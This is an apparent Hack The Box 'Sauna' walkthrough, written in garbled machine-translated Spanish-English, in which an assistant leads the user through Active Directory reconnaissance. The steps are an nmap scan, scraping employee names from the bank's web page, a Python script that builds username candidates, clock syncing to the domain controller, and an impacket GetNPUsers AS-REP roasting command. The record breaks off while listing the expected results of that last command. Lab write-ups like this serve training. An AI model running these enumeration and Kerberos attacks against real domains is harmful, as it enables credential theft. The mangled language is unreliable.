9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-04-23T17:56:35
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.43 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/SAUNA/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/SAUNA/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

## objective

Close correctly the phase 1 of Sauna basis of the enumeration observed and fijar a main branch of trabajo junto with a single next step, breve and with value didactic.

## Verified facts

The reconocimiento initial leaves signals very strong of that the objective  comporta as a domain controller Windows. Appear DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM and ADWS, also of several puertos RPC altos. Nmap identifica the host as `SAUNA`, the domain as `EGOTISTICAL-BANK.LOCAL`, IIS 10.0 in 80/tcp and WinRM in 5985/tcp. Also  observa that SMB signing is habilitado and requerido.

The web exposed in 80/tcp not parece a página genérica without context. Responde with the título `Egotistical Bank :: Home`, what that conecta the identity of the domain with a web corporate visible. That relationship is relevant because une the surface of Active Directory with a posible exposición of names, structure internal or context organizativo from contenido public.

## assumptions

The inference main is that the surface dominant not is a web vulnerable in sentido classic, but rather a environment Active Directory apoyado by information public exposed in the web. In this point, the web parece more a source of identities that a objective directo of exploitation.

Exists a hipótesis of trabajo reasonable según the cual a página informativa of the sitio could mostrar names completos of employees, and esos names could servir for derivar candidate users of the domain before of validate Kerberos.

Also remains as hipótesis secondary that LDAP anónimo and SMB anónimo can comprobarse, but without esperar necesariamente that  conviertan in the path dominant of the case.

Sigue pending of verify si the `clock skew` cercano a siete horas afectará more adelante a pruebas relacionadas with Kerberos. Of momento not invalida the metodología, but it is advisable dejarlo anotado from the inicio.

## method

The phase 1  cierra using únicamente the evidence observed in the enumeration: system probable, rol of the host, services, domain and surface dominant.

A basis of ahí,  prioriza Verification of low noise and high value before of move a técnicas more sensibles. Not  avanza still hacia abuse Kerberos nor remote access because before it is advisable confirm si the web aporta real names reutilizables as basis for a enumeration of identities more precisa.

## answer

The phase 1 can darse by sufficiently closed.

The dominant finding already not is simplemente that haya muchos puertos abiertos, but rather something more specific: the objective is presented a huella very consistente with a domain controller Windows and, also, expone a web corporate asociada to the same context organizativo. That combinación orienta the case hacia identity, permissions and enumeration of Active Directory, not hacia exploitation web noisy from the primer momento.

By that motivo, the main branch active not debería be WEB-BASIS in sentido classic, nor tampoco SMB or WinRM by now. The main branch more coherente in this momento is **AD_ENUM apoyada by intelligence public from the web**. Kerberos, LDAP, Global Catalog and WinRM indican that the value of the case probablemente estará in accounts, autenticación and permissions. The web of the banco, by su part, ofrece a path reasonable for localizar real names and convertirlos afterwards in candidates of user of the domain.

The secondary branches yes merecen quedar anotadas. LDAP anónimo and SMB anónimo son checks razonables, but not dominan aún the case. WinRM remains registrado only as path of validación later si appear credentials real. Also it is advisable anotar the clock skew as observation operational important for phases posteriores relacionadas with Kerberos.

The single next step more clean is inspeccionar `about.html` and confirm si expone names completos reutilizables for derivar users of the domain.  propone that step because part of a signal previous specific, has a coste mínimo, genera very little noise and, si da result, allows build the next decision on a basis real in lugar of assumptions.

**Dominant finding now:** domain controller Windows with web corporate useful for intelligence of identities.
**Active main branch:** AD_ENUM apoyada by public website.
**Secondary branches noted:** LDAP anónimo, SMB anónimo, WinRM only for validación later with credentials and anotación of `clock skew` for futuras pruebas Kerberos.
**Single next step:** inspeccionar `about.html` and confirm si expone names completos reutilizables for derivar users of the domain.

## commands

```bash
curl -s http://10.129.95.180/about.html -o about.html
grep -Eoi '[A-Z][a-z]+ [A-Z][a-z]+' about.html | sort -u
```

The primer command  propone for validate a hipótesis very specific with the mínimo noise: check si the public website expone names of employees. Not  executes by curiosidad, but rather for buscar materia prima useful for identity in Active Directory.

The segundo not explota nada. Only filtra posibles names completos of the HTML for convert a observation visual in a list reusable. What important not is the cantidad of coincidencias, but rather si appear names plausible and completos that permitan sostener the next step with basis real.

## checks

Si `about.html` returns names completos, the result pasará of hipótesis a Verified fact and already existirá a basis reasonable for generate conventions of user and move a validación Kerberos.

Si `about.html` not contiene names or returns something irrelevante, not convendrá jump still a técnicas more agresivas. The reevaluación lógica será review of forma ligera otras páginas visibles of the web and, in paralelo, do a comprobación breve of LDAP/SMB anónimos as secondary branches.

The `clock skew` must quedar anotado from already, because although still not  esté in phase of abuse Kerberos, that dato can explain fallos posteriores and evitar diagnósticos equivocados.

## writeup_notes

The enumeration initial of Sauna not only revela objective Windows, but rather that perfila with bastante claridad a domain controller. The presencia simultánea of Kerberos, LDAP, Global Catalog, WinRM and services RPC, unida a web corporate coherente with the domain detectado, orienta the investigación hacia chain of Active Directory basada in identities real and not hacia exploitation web directa.

Reusable lesson: when a machine of Active Directory expone a web corporate apparently inocente, that web can not be a puerta of entrada technical, but yes a source decisiva of real names, structure organizativa and context. In muchos casos, the primer step useful not is romper nada, but rather read correctly what that the own organización has publicado.

❯ curl -s http://10.129.95.180/about.html -o about.html
grep -Eoi '[A-Z][a-z]+ [A-Z][a-z]+' about.html | sort -u
about py
About Us
aliquam leo
aliquet leo
All Rights
amet eros
amet leo
amet mattis
amet pretium
Android Compatible
Apply Now
augue ac
Author URL
Auto Loan
auto text
bank account
banner bottom
bar bg
bar progress
between align
Bootstrap Web
bottom py
Bowie Taylor
brand pt
btn btn
btn mr
btn read
Business Loan
Business Reach
button type
center mt
center my
center py
Check Your
Choose Your
consectetur adipiscing
contact my
Contact Us
container contact
container py
content py
content text
Creative Commons
Credit Cards
cursus rhoncus
Customer Care
Daily Expenses
Debit Card
default read
Design by
div class
div id
DOCTYPE html
dolor efficitur
dolor sit
Donec malesuada
Drop Down
dui turpis
Duis nisi
Education Loan
Egotistical Bank
elementum finibus
erat sit
ex sit
fa clr
fa fa
felis dapibus
Fergus Smith
fermentum eget
Financial Services
Find us
finibus lorem
finibus sed
First Tier
Fixed Deposit
Flat Web
flex justify
fluid image
footer bottom
footer class
footer text
for Nokia
form method
form mx
free webdesigns
function hideURLbar
Fusce semper
gd mt
Get Your
grid mt
grid test
grids row
grids text
Health Loan
Helping Your
Home Loan
html lang
Hugo Bear
img mt
img src
in convallis
inf pl
info list
info text
inner py
input type
Integer sit
Integer ultrices
ipsum sit
Its Full
label for
Latest Posts
left mb
left pl
left text
li class
li mt
libero aliquam
License URL
link href
link rel
Loan Management
Lorem ipsum
ls mb
ls mt
ls my
ls two
luctus massa
malesuada sedint
managers but
massa eu
Mauris hendrerit
Meet the
Meet The
meta charset
meta name
Meta tag
Motorola web
nsequursu dsdesdc
Nulla congue
Nullam dui
of Banking
one mt
Onec consequat
Online Marketing
only one
Our Mission
Our Skills
Our Team
for col
Personal Banking
Personal Loan
Phasellus sed
Praesent ullamcorper
pretium metus
Previous Record
Privacy Policy
products py
pvt ml
pvt py
pvt serve
Quisque vitae
re Provided
Read More
recycle mr
Repay Responsive
Repayable in
right col
right ml
right mt
right text
row bottom
row footer
row products
row subscribe
sapien ut
Savings Account
scelerisque tellus
sec page
section class
security manager
services about
Services we
Shaun Coins
sid ornare
Simple Websites
Single Page
sit amet
Small Business
Smartphone Compatible
So many
Social Media
Sophie Driver
Sounds about
span class
Steven Kerb
Suspendisse porta
Suspendisse venenatis
toggle toogle
top text
ul class
ultricies velit
unstyled mt
utpretium nulla
vel ex
web template
welcome py
What We
wide range
xxx Honey
Your Email

## objective

Analyze the output obtenida of `about.html`, separar signal useful of noise and decidir the single next step with basis in evidence real.

## Verified facts

The página `about.html` exists, responde and contiene texto sufficient as for extraer contenido semiestructurado.

The expresión regular utilizada has devuelto much noise, but dentro of the output appear several names own with formato clearly plausible of people:

* Fergus Smith
* Bowie Taylor
* Hugo Bear
* Shaun Coins
* Sophie Driver
* Steven Kerb

That convierte in **Verified fact** that the public website expone names completos reutilizables as basis for a branch of identity.

Also remains verified that the filtro usado is too much broad for this case, because mezcla real names with gran cantidad of texto decorativo, clases CSS, frases of plantilla and cadenas without value operational.

## assumptions

The inference main is that esos names pertenecen a employees or profiles corporativos mostrados in the web and that, by tanto, son buenos candidates for derivar conventions of user of the domain.

The inference secondary is that the página probablemente contiene a sección tipo “team” or similar, and that extraer the names of forma more clean mejorará the trazabilidad of the case and reducirá errores in the next phase.

Still is pending of verify what convention of names usa really the domain for the accounts: name simple, initial+apellido, name.apellido u otra variante.

## method

First  separa the evidence useful of the noise generado by a expresión regular too much genérica.

Afterwards  preserves únicamente the part with value for Active Directory: the names completos plausible.

With that basis, the next step not must be still forzar services nor open several branches a the vez, but rather build a list clean of identities candidatas for poder move then a validaciones controladas on naming convention.

## answer

The prueba has salido bien and, also, has servido for something important: already not  trabaja on a intuición, but rather on a evidence specific. The public website expone several names completos that encajan perfectamente with a futura phase of enumeration of identities in Active Directory.

The result useful not is toda the output of the `grep`, because casi todo that is basura of plantilla HTML. What valioso of verdad son the seis names that destacan clearly as people real:

* Fergus Smith
* Bowie Taylor
* Hugo Bear
* Shaun Coins
* Sophie Driver
* Steven Kerb

That hallazgo cambia the situación. The web leaves of be a surface meramente informativa and moves a be a source real of intelligence of identities. That refuerza that the main branch siga siendo **AD enum apoyada by information public**.

Now same not matters jump still a LDAP, SMB or WinRM as paths principales. Tampoco matters encadenar several checks a the vez. What more clean is consolidar first a list of real names bien curada and, a basis of ahí, derivar conventions of user plausible.

**Dominant finding now:** the public website expone names completos useful for derivar identities of the domain.

**Active main branch:** AD enum apoyada by intelligence public from the web.

**Secondary branches noted:** LDAP anónimo, SMB anónimo, WinRM for validación later si appear credentials, and observation of the `clock skew` for phases posteriores relacionadas with Kerberos.

**Single next step:** save a list clean of real names and dejarla preparada for generate candidate users.

## commands

```bash id="5n0mrq"
printf '%s\n' \
'Fergus Smith' \
'Bowie Taylor' \
'Hugo Bear' \
'Shaun Coins' \
'Sophie Driver' \
'Steven Kerb' > fullnames.txt

cat fullnames.txt
```

The motivo of this step is very specific: before of derivar candidate users it is advisable fijar a basis clean and libre of noise. The signal previous that lleva hacerlo is that the `grep` already confirmed real names, but mezclados with demasiadas coincidencias irrelevantes.

The primer command not explota nada nor toca the objective. Only convierte the observation useful in a artefacto of trabajo clean. The segundo sirve for verify that the list was left bien guardada and without errores of transcripción.

What that matters of verdad in the output is confirm that the list contiene únicamente names plausible and completos. Si appears noise, the next phase  contamina; si the list is clean, the derivation of users tendrá mucha more calidad.

## checks

Check that `fullnames.txt` contenga only the real names and not cadenas decorativas of the HTML.

Verify that not haya duplicados nor errores obvios of copia.

Dejar anotado that, a basis of this point, what next already not será “buscar names”, but rather “evaluar what convention of accounts could use the domain with esos names”.

## writeup_notes

The revisión of `about.html` allowed transformar a web apparently corporate in a source práctica of intelligence for Active Directory. Although the extracción initial returned much noise by the patrón usado, between that noise aparecieron several names completos plausible of employees, suficientes for justificar a branch centrada in derivation of identities.

Reusable lesson: in entornos Windows with signals of domain, a public website can aportar much value incluso without vulnerabilities visibles. The objective initial not siempre is encontrar a falla technical, but rather reunir real names that then permitan build a enumeration of identities much more precisa.

❯ printf '%s\n' \
'Fergus Smith' \
'Bowie Taylor' \
'Hugo Bear' \
'Shaun Coins' \
'Sophie Driver' \
'Steven Kerb' > fullnames.txt

cat fullnames.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: fullnames.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Fergus Smith
   2   │ Bowie Taylor
   3   │ Hugo Bear
   4   │ Shaun Coins
   5   │ Sophie Driver
   6   │ Steven Kerb
───────┴

objective

Registrar correctly the artefacto of trabajo generado and dejar preparado the next step of the branch of identities in Sauna.

verified_facts

The file `fullnames.txt` has quedado creado correctly and contiene seis names completos plausible:

* Fergus Smith
* Bowie Taylor
* Hugo Bear
* Shaun Coins
* Sophie Driver
* Steven Kerb

The ubicación real of the file already is verified:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt`

The list is clean, without noise HTML, without duplicados visibles and with formato adecuado for reutilizarla in the next phase.

assumptions

The inference main is that this list already can considerarse a basis operational válida for derivar conventions of name of user of the domain.

Also is reasonable asumir that the next step useful not is seguir buscando more names, but rather transformar these names completos in candidates of account with patrones habituales of Active Directory.

method

First  consolida the evidence useful in a file clean and bien ubicado dentro of `content/users`, that is a path coherente for artefactos operativos relacionados with identities.

Afterwards, in lugar of open several branches a the vez,  maintains a sola línea of trabajo: move of names completos a posibles names of user.

answer

perfect. Así is bien guardado.

The ubicación is good and has lógica operational:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt`

That leaves the phase current bien closed: the web already has aportado a list of identities plausible and that evidence already is convertida in a artefacto clean reusable.

Dominant finding now: the public website already has producido names completos useful for derivar identities of the domain.

Active main branch: AD enum apoyada by intelligence public from the web.

Secondary branches noted: LDAP anónimo, SMB anónimo, WinRM for validación later si appear credentials, and observation of the clock skew for futuras pruebas Kerberos.

Single next step: generate, a basis of `fullnames.txt`, a list of names of user candidates with conventions típicas of domain.

commands

```bash id="4w1hvk"
cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users
```

This step not searches descubrir nada nuevo, but rather fijar the context correct of trabajo before of generate the candidates of user from the file already validated.

checks

Check that futuras outputs derivadas of this file  guarden also in `content/users` for keep juntas the evidence of identity.

Keep `fullnames.txt` as source basis and not sobrescribirlo, for preserve trazabilidad between real names observed and names of user derivados.

writeup_notes

The revisión of the public website allowed obtain a list clean of names completos and convert a observation visual in a artefacto operational reusable. A basis of that momento, the investigación leaves of depender of intuiciones and moves a apoyarse in identities specific extraídas of the environment objective.


## objective

Move of real names observed in the web a list clean of names of user candidates, without touch still services of autenticación nor open branches paralelas.

## Verified facts

The file basis already exists and is bien ubicado in:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt`

That file contiene seis names completos plausible and useful for trabajar the branch of identities.

The operador already is situado in the directorio correct of trabajo:

`/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users`

## assumptions

The hipótesis of trabajo more reasonable is that the domain use a convention typical of Active Directory for the accounts of user, by ejemplo:

* name
* apellido
* name.apellido
* initial+apellido
* name+initial apellido

Still not is verified cuál of esas conventions usa really the domain. By that, the next step correct not is probar autenticación aún, but rather generate first a list ordenada of candidates.

## method

 maintains `fullnames.txt` as source clean and  genera segundo file derivado with posibles names of user.

 evita introducir tools innecesarias in this point. The derivation  does of forma local, reproducible and with little noise, for that the next phase parta of a artefacto clear and revisable.

## answer

The single next step correct is generate a list of candidate users a basis of `fullnames.txt`.

The razón is simple: already exists evidence sufficient of real names, but still not exists evidence of the convention of accounts usada by the domain. Before of validate nada contra Kerberos or LDAP, it is advisable build a list reasonable of candidates and dejarla guardada as artefacto operational.

Dominant finding now: the public website already has proporcionado identities plausible.

Active main branch: AD enum apoyada by intelligence public from the web.

Secondary branches noted: LDAP anónimo, SMB anónimo, WinRM for a phase later si appear credentials, and observation of the clock skew for futuras validaciones with Kerberos.

Single next step: generate `usernames.txt` a basis of `fullnames.txt`.

## commands

```bash id="kz03np"
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        first,
        last,
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
        f"{first}{last[0]}",
        f"{first[0]}.{last}",
        f"{last}.{first}",
        f"{last}{first[0]}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidates in {dst}")
PY

head -n 30 usernames.txt
```

This block  propone because the signal previous already exists: there is real names and limpios. What that falta not is more collection, but rather transformar that evidence in candidate users with patrones habituales.

What does: lee `fullnames.txt`, genera several conventions comunes of account, elimina duplicados and guarda the result in `usernames.txt`.

What is expected: a list compacta and reusable of names of user plausible, list for the next phase.

Which part of the output really matters: confirm that appear patrones lógicos as `fsmith`, `fergus.smith`, `fergussmith`, `sdriver`, `skerb`, etc., and that the file  crea without noise.

How the next decision changes: si the list remains bien, the next phase already podrá centrarse in a validación controlada of naming convention or of exposición Kerberos, in lugar of seguir inventando users a mano.

## checks

Check that `usernames.txt`  haya creado in the directorio current.

Review visualmente the primeras líneas for confirm that not appear espacios, mayúsculas extrañas nor cadenas vacías.

Keep `fullnames.txt` intacto as source original and use `usernames.txt` as artefacto derivado for the next phase.

## writeup_notes

A vez obtained real names from the public website, the step metodológicamente correct not is probar access of inmediato, but rather convert that evidence in a list estructurada of posibles accounts. That allows that the next validación on Kerberos or services of directorio parta of identities plausible and not of assumptions improvisadas.

Reusable lesson: in entornos Active Directory, a list clean of names completos only is the principio. The value real appears when  traduce that information public a conventions of account probables and  documenta that transición with trazabilidad.

## We run the block and review the output

head -n 30 usernames.txt
[+] Guardados 60 candidates in usernames.txt
fergus
smith
fergus.smith
fergussmith
fergus_smith
fsmith
ferguss
f.smith
smith.fergus
smithf
bowie
taylor
bowie.taylor
bowietaylor
bowie_taylor
btaylor
bowiet
b.taylor
taylor.bowie
taylorb
hugo
bear
hugo.bear
hugobear
hugo_bear
hbear
hugob
h.bear
bear.hugo
bearh

## objective

Analyze the calidad of `usernames.txt`, separar candidates plausible of candidates ruidosos and preparar a prioritized list for the next validación of identities.

## Verified facts

The file `usernames.txt`  has generado correctly and contiene **60 candidates** derivados of the seis names completos.

The output confirms that the derivation funciona and that incluye patrones típicos of account of domain, between ellos:

* `fsmith`
* `fergus.smith`
* `fergussmith`
* `btaylor`
* `hbear`

Also  ve that the file mezcla patrones very plausible with otros bastante flojos or of little value operational, by ejemplo:

* `ferguss`
* `bowiet`
* `hugob`

That means that the generación has sido useful, but still not it is advisable tratar the 60 candidates as igual of buenos.

## assumptions

The assumption more reasonable is that the domain probablemente use a convention corporate relativamente simple and repetible, not a combinación arbitraria of todas the variantes posibles.

In a environment así, the patrones that normalmente merecen more atención initial son:

* `nombre.apellido`
* `inicialapellido`
* `nombreapellido`
* `nombre_apellido`

The candidates formados as `nombre + inicial del apellido` or variantes invertidas suelen have less value initial and meten more noise of the necesario.

## method

First  valida that the artefacto derivado  haya creado bien.

Afterwards  reduce the conjunto a **prioritized list**, more short and more coherente with conventions corporativas habituales.

The idea not is tirar information, but rather separar a primera tanda of candidates strong for that the next validación sea more clean and tenga better trazabilidad.

## answer

The output is good, but still not is the list with the that it is advisable avanzar directly.

What important not is that haya 60 candidates, but rather that between ellos already appear several conventions very sólidas. That confirms that the transición of real names an accounts plausible  has fact bien. The problema is that the list mezcla signal with too much relleno.

Now same not matters seguir ampliando the número of variantes. Matters do what contrario: **priorizar**.

The decision correct in this point is preparar a list reducida with the conventions that have more sentido in a domain corporate. Así  evita noise innecesario and  leaves the next validación much more clean.

**Dominant finding now:** already exist candidates of user plausible derivados of real names observed.

**Active main branch:** AD enum apoyada by intelligence public from the web.

**Secondary branches noted:** LDAP anónimo, SMB anónimo, WinRM for a phase later si appear credentials and observation of the `clock skew` for futuras validaciones relacionadas with Kerberos.

**Single next step:** generate a prioritized list of candidates of user with the patrones more plausible.

## commands

```bash
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames_priority.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidatos prioritarios en {dst}")
PY

cat usernames_priority.txt
```

 propone this step because the signal previous already exists: there is real names and already  generated a list broad of candidate users. What that falta now is **ordenar the calidad** of that information before of seguir.

What does: toma `fullnames.txt`, genera only the formatos more plausible and the guarda in `usernames_priority.txt`.

What is expected: a list more small, more clean and more realista for a primera validación of identities.

Which part of the output really matters: confirm that aparezcan candidates as:

* `fergus.smith`
* `fergussmith`
* `fergus_smith`
* `fsmith`

and sus equivalentes for the demás names.

How the next decision changes: si that list remains bien, the next step already podrá centrarse in a validación controlada of candidate users, in lugar of seguir trabajando with a list too much noisy.

## checks

Check that `usernames_priority.txt`  crea in the directorio current.

Verify visualmente that the list is more short and that already not appear variantes flojas as `ferguss`, `bowiet` or `hugob`.

Check that each name basis aporta cuatro variantes and that not  have perdido candidates strong as `fsmith` or `sdriver`.

Keep `usernames.txt` as list broad and `usernames_priority.txt` as list of trabajo prioritized.

## writeup_notes

The derivation initial of candidate users cumplió su función: transformar real names in posibles accounts of the domain. Without embargo, not todas the variantes generadas have the same value. The step metodológicamente correct not is probar todo without filtrar, but rather separar first the conventions more plausible for reducir noise and mejorar the calidad of the validación later.

Reusable lesson: in Active Directory, generate muchas variantes not siempre mejora the enumeration. A menudo, a list more small but better prioritized da mejores results and leaves a trazabilidad much more clear.

## We run the block and review the output

cat usernames_priority.txt
[+] Guardados 24 candidates prioritarios in usernames_priority.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: usernames_priority.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ fergus.smith
   2   │ fergussmith
   3   │ fergus_smith
   4   │ fsmith
   5   │ bowie.taylor
   6   │ bowietaylor
   7   │ bowie_taylor
   8   │ btaylor
   9   │ hugo.bear
  10   │ hugobear
  11   │ hugo_bear
  12   │ hbear
  13   │ shaun.coins
  14   │ shauncoins
  15   │ shaun_coins
  16   │ scoins
  17   │ sophie.driver
  18   │ sophiedriver
  19   │ sophie_driver
  20   │ sdriver
  21   │ steven.kerb
  22   │ stevenkerb
  23   │ steven_kerb
  24   │ skerb

## objective

Determinar the next step correct a basis of the prioritized list of candidate users, minimizando noise and evitando validaciones Kerberos engañosas by a posible problema of clock skew.

## Verified facts

The file `usernames_priority.txt`  has generado correctly and contiene 24 candidates priorizados, with cuatro variantes by each name completo observed in the web.

The list has good calidad operational. Incluye patrones very plausible for a environment Active Directory corporate, as:

* `fsmith`
* `btaylor`
* `hbear`
* `scoins`
* `sdriver`
* `skerb`

and also variantes razonables as:

* `fergus.smith`
* `bowie.taylor`
* `hugo.bear`
* `shaun.coins`
* `sophie.driver`
* `steven.kerb`

The phase of derivation of identities can considerarse closed: already exists a list short, clean and prioritized for move a validación.

Also sigue vigente a observation important of the phase initial: there is indicios of a `clock skew` notable between the attacker environment and the domain controller.

## assumptions

The assumption main is that a of the conventions incluidas in `usernames_priority.txt` coincide with the patrón real of accounts of the domain.

The segunda assumption, more important for the next step, is that cualquier validación basada in Kerberos can fallar or producir results confusos si the clock skew not  comprueba before.

By tanto, although the list of users already is list, still not it is advisable usarla directly contra Kerberos without atender before that posible problema of time.

## method

First  consolida that the prioritized list already is sufficiently bien built and not necesita more variantes.

Afterwards  evita error methodological very común in entornos AD: lanzar validaciones Kerberos without check before the synchronization temporal.

The single next step not será still validate users, but rather check and, si does falta, correct the clock skew of the attacker environment respecto to the objective. That prepara the terreno for that the next validación of identities sea fiable.

## answer

The list already is in a point very good. Not merece the pena seguir generando more variantes because, a basis of here, añadir more names only metería noise.

What correct now not is atacar more strong, but rather preparar bien the next phase. AND the preparación necesaria in this case is review the clock skew before of touch Kerberos.

The razón is important: in Active Directory, Kerberos is very sensitive to the time. Si exists a `clock skew` large, a validación later can parecer fallida not because the user not exista, but rather because the time between cliente and servidor not encaja. That falsearía the reading of the case and haría perder time.

Así that the single next step cambia ligeramente respecto a what previsto: before of validate candidate users, it is advisable **check and correct the clock skew**.

**Dominant finding now:** already exists a prioritized list of candidate users with calidad sufficient for move a validación.

**Active main branch:** enumeration of Active Directory apoyada by identities obtained from the web.

**Secondary branches noted:** LDAP anónimo, SMB anónimo and WinRM for a phase later si appear credentials válidas.

**Single next step:** verify and, si does falta, correct the clock skew of the attacker environment before of cualquier validación basada in Kerberos.

## commands

```bash id="6q8wte"
date -u
sudo ntpdate -q 10.129.95.180
sudo ntpdate -u 10.129.95.180
date -u
```

 propone this step because the signal previous already exists: the reconocimiento initial dejó indicios of a skew temporal important. Before of use Kerberos, it is advisable confirm si that problema sigue presente.

What does each command:

* `date -u` shows the time UTC current of the attacker environment.
* `sudo ntpdate -q 10.129.95.180` consulta the diferencia horaria respecto to the objective without cambiar still nada.
* `sudo ntpdate -u 10.129.95.180` corrige the time using the objective as referencia, si the consulta confirms that the skew is real.
* the último `date -u` allows check the result tras the Correction.

What is expected: confirmación clear of si the time local is desviado and, in case afirmativo, dejarlo alineado for that the next phase with Kerberos sea fiable.

Which part of the output really matters: the diferencia of time reportada by `ntpdate -q` and the Verification later of that the time was left ajustada.

How the next decision changes: si the skew remains corregido, the next phase podrá centrarse already in a validación clean of candidate users without that the time distorsione the results.

## checks

Check si `ntpdate -q` reporta diferencia significativa.

Si the diferencia is large, confirm that the ajuste  aplica correctly with `ntpdate -u`.

Verify afterwards that the time UTC local remains razonablemente alineada with the of the objective.

Not move still a validación Kerberos until dejar this point resuelto.

## writeup_notes

A vez obtenida prioritized list of candidate users, the next step not siempre is lanzar validaciones of identity of inmediato. In entornos Active Directory, the synchronization temporal forma part of the preparación technical of the attack, because Kerberos depends of that cliente and servidor compartan a referencia horaria sufficiently cercana.

Reusable lesson: a good list of users can quedar inutilizada by a problema of time mal interpretado. Before of concluir that a validación Kerberos falla by users incorrectos, it is advisable descartar first that the clock of the attacker environment esté desalineado.

## We run the block and review the output

❯ date -u
sudo ntpdate -q 10.129.95.180
sudo ntpdate -u 10.129.95.180
date -u
dijous, 23 d’abril of 2026, 11:44:05 UTC
[sudo] password for r4mon:
2026-04-23 20:44:15.93361 (+0200) +25202.319033 +/- 0.024418 10.129.95.180 s1 not-leap
2026-04-23 20:44:15.198641 (+0200) +25202.317982 +/- 0.023897 10.129.95.180 s1 not-leap
CLOCK: time stepped by 25202.317982
dijous, 23 d’abril of 2026, 18:44:15 UTC

## objective

Confirm that the clock skew has quedado corregido and preparar a validación fiable of the candidate users frente a Kerberos, manteniendo a sola branch active and evitando lecturas erróneas of results.

## Verified facts

The attacker environment had a clock skew very large respecto to the objective.

The consulta of synchronization showed a diferencia aproximada of **25202 segundos**, is that is, unas **7 horas**.

The Correction  aplicó correctly and the clock local was left ajustado tras the `time stepped`.

That convierte the problema temporal in a fact already resuelto for this phase.

The prioritized list of users already exists and is list for be utilizada as basis of validación controlada.

## assumptions

The inference main is that, a vez corregido the time, the pruebas relacionadas with Kerberos already not deberían fallar by a problema of synchronization.

The next hipótesis of trabajo reasonable is that between the 24 candidate users can existir to the less a valid account of the domain and, si alguna not requiere Kerberos pre-authentication, that condición debería poder detectarse of forma fiable now.

Sigue pending of verify what convention of account usa really the domain and si alguna of esas accounts is presented a configuración weak aprovechable in Kerberos.

## method

First  cierra formalmente the incidencia of time, because already not has sentido seguir tratándola as hipótesis.

Afterwards  moves a single Verification short and coherente with the branch active: check si alguno of the candidate users returns answer useful in Kerberos without necesidad of password.

Not  abren still branches paralelas of SMB, LDAP or WinRM, because the evidence current already justifica prueba more valiosa and more alineada with the surface dominant of the case.

## answer

This step has sido important and has salido bien.

The Correction of the clock not is a detalle smaller: elimina causa very seria of falsos negative in Active Directory. A basis of now, si a prueba with Kerberos falla, será much more probable that falle by identity incorrecta or by configuración real of the domain, and not because the time estuviera roto.

That cambia clearly the decision next. Before not convenía touch Kerberos because cualquier result podía estar contaminado by the clock skew. Now yes has sentido hacerlo.

The main branch sigue siendo **enumeration of Active Directory apoyada by identities obtained from the web**. Dentro of that branch, the single next step more clean is check si alguno of the candidate users allows obtain a answer useful mediante a Verification Kerberos without password.

Not it is advisable open still otras líneas because this already is bien preparada, has low coste and can dar a salto of value very high si appears an account with pre-authentication deshabilitada.

**Dominant finding now:** the problema of synchronization temporal has quedado resuelto and Kerberos already can evaluarse with fiabilidad.

**Active main branch:** enumeration of Active Directory centrada in identities and validación Kerberos.

**Secondary branches noted:** LDAP anónimo, SMB anónimo and WinRM for a phase later si appear credentials reutilizables.

**Single next step:** check si alguno of the candidate users returns material useful in Kerberos without necesidad of password.

## commands

```bash id="0u2m3p"
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames_priority.txt -not-Pass -dc-ip 10.129.95.180
```

This command  propone because the signal previous already is madura: there is a prioritized list of candidates and the problema of time already not distorsiona the reading.

What does: prueba each user of the file contra the domain controller and comprueba si algunan account allows obtain answer AS-REP without requerir password.

What is expected: uno of these tres escenarios:

1. that algunan account devuelva material AS-REP useful, what that convertiría that identity in dominant finding;
2. that aparezcan errores of user inexistente or answers vacías, what that ayudaría depurar the convention of names;
